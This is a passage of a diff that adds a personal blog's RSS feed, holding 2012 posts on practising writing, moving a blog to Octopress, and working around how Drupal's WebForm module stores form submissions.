+&lt;p&gt;I have always been fascinated with writers throughout my life. The good ones are able to reflect on a topic and communicate their thoughts in a clear way for readers to digest. I realized that writing is a skill that I would love to get better at. While I feel that I am adept in communicating my ideas through speech, I am quite terrible at conveying my ideas with written words. Writing has always been my weak point in my academic career. In recent years, my writing have actually gotten worse due to a lack of essays assignments in my engineering classes.&lt;/p&gt;
+
+&lt;p&gt;While I enjoyed only writing one or two papers a year, it’s safe to say that the quality of the papers have remained stagnant, if not in decline. And so upon reading James Somers’ post, I can’t help but write this blog post to remind myself to continue practicing writing. It will take a while to get to the level of writing I desire, but we all have to start from somewhere.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 14 Oct 2012 00:00:00 -0700</pubDate>
+        <link>http://ericren.me/blog/2012/10/14/writing/</link>
+        <guid isPermaLink="true">http://ericren.me/blog/2012/10/14/writing/</guid>
+      </item>
+    
+      <item>
+        <title>Finished Moving Blog</title>
+        <description>&lt;p&gt;This weekend, I finally got a chance to move my blog over from posterous to octopress. I had the bad luck of making a posterous blog right before twitter acquired them earlier this year. And so fearing that posterous will just rot away, I’ve been looking for blogging alternatives.&lt;!--more--&gt; Although I could have easily made a free blog on wordpress.com or blogger, I decided I wanted to be in charge of my own data and not have my blog in the mercy of other companies. After some research, I found &lt;a href=&quot;http://octopress.org/&quot;&gt;Octopress&lt;/a&gt; and am excited to see how using this blogging framework will turn out.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 03 Sep 2012 19:46:00 -0700</pubDate>
+        <link>http://ericren.me/blog/2012/09/03/finished-moving-blog/</link>
+        <guid isPermaLink="true">http://ericren.me/blog/2012/09/03/finished-moving-blog/</guid>
+      </item>
+    
+      <item>
+        <title>Drupal WebForm Module hiccups</title>
+        <description>&lt;p&gt;For the past few days, I have been reading countless about making web forms with drupal.  My task was to make a web form that stored submissions in a database that can easily be accessed by external services.  Luckily, there’s an awesome WebForm module that did most of the heavy lifting for me.  In fact, it even saved all the data into its own database.&lt;!--more--&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately, the submission data was laid out in a convoluted way, and it was split between two tables, and moreover.  When you are specifying options for a select field in the web form, the webform_submitted_data table only contains the keys whereas the webform_components table contains the mapping in a general ‘extra’ field string.  At first it might seem like there will be data integrity issues if the select option key-value pairs change over time.  If 1 maps to ‘france’ then there’s a row in the data table with a value of 1 for that option.  If I change 1 to map to ‘germany’, that record in the data table is now invalid.  You can read more about the issue and resolution here, but essentially thats the intended behavior.&lt;/p&gt;
+
+&lt;p&gt;I needed to save the values in a data table, not the keys.  So there are a couple ways to solve this:&lt;/p&gt;
+
+&lt;p&gt;Parse the mapping string with SQL and join it with the oddly structured data table… &lt;em&gt;shudder&lt;/em&gt;
+Hack away at the webform hooks to save the data in my own table.&lt;br /&gt;
+Disregarding the messy first method, I went ahead and made a module to hook into WebForm.  Everything was fine until I ran into problem parsing the key option mappings…&lt;/p&gt;
+
+&lt;p&gt;And so after reading the issue again, someone suggested making the keys the same as the values.  Then the table has the same data as value.  Such a simple solution.  If only I read the issue thread more closely, I would have saved a lot of headaches and time.&lt;/p&gt;
+
+&lt;p&gt;I still had to deal with the nonstandard layout of the submission data table, but thankfully I found the webform_mysql_views module, which essentially solved the problem for me.  Again I was saved by reading resources more closely.&lt;/p&gt;
+
+&lt;p&gt;I learned a few things from this mini-project. First, RTFM; always read things closely.  Second, if you want a task done in Drupal, chances are there’s a module for that, so keep looking.   And lastly, the Drupal community is great but as a framework, I feel that the learning curve is very high for beginners compared to other frameworks like rails.  However I can see why Drupal is still a great choice for many sites who need a robust, flexible CMS.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 09 Jun 2012 04:03:00 -0700</pubDate>
+        <link>http://ericren.me/blog/2012/06/09/drupal-webform-module-hiccups/</link>
+        <guid isPermaLink="true">http://ericren.me/blog/2012/06/09/drupal-webform-module-hiccups/</guid>
+      </item>
+    
+  </channel>
+</rss>
